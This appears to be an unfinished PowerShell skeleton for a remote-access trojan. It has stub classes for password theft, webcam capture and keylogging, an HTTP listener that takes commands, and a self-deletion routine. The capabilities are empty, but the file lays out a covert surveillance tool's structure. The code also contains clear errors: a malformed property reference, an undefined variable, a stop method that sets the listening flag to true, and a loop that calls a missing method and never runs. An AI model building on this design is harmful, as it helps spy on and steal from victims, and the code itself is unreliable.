class Passwords{
    [string]get(){
        return ''
    }
}

class Webcam{
    [boolean]start(){
        return $true;
    }

    [boolean]stop(){
        return $true;
    }
}

class Keylogger{
    [boolean]start(){
        return $true;
    }

    [boolean]stop(){
        return $true;
    }
}

class Server{
    hidden [int]$Port = 80;
    [boolean]$isListening = $false;
    [System.Net.HttpListener]$http = (New-Object System.Net.HttpListener);

    [void]start(){
        $this.http.Prefixes.Add('http://localhost:' + $this.Port +'/');
        $this.http.Start();
        $this.isListening = $true;
    }

    [void]stop(){
        $this.http.Stop();
        $this.isListening = $true;
    }

    [void]restart(){
        $this.http.Stop();
        $this.http.Start();
    }

    [void]setPort([int]$p){
        this.$Port = $p;
        $this.restart();
    }

    [object]getRequest(){
        $context = $this.http.GetContext();
        $rawUrl = $context.Request.RawUrl.split('?');
        $path = $rawUrl[0];
        $query = @{};
        $rawParameters = $rawUrl[1].Split("&");

        foreach ($rawParameter in $rawParameters) {
            $Parameter = $rawParameter.Split("=")
            $Parameters.Add($Parameter[0], $Parameter[1])
        }

        return @{
            "path" = $path;
            "query" = $query;
            "body" = $context.Request.Body;
            "method" = $context.Request.Method
        }
    }
}

function Install-Dependencies{

}

function Remove-Self{

}

$http = [Server]::new();

while ($http.IsListening) {
    $context = $http.GetContext();

    if ($context.Request.HttpMethod -eq 'GET') {
        $params = $context.Request.RawUrl;

        switch($params){
            "passwords"{}
            "webcam"{}
            "keylogger"{}
            "server"{}
            "install"{ Install-Dependencies }
            "destroy"{ Remove-Self }
        }
    };
}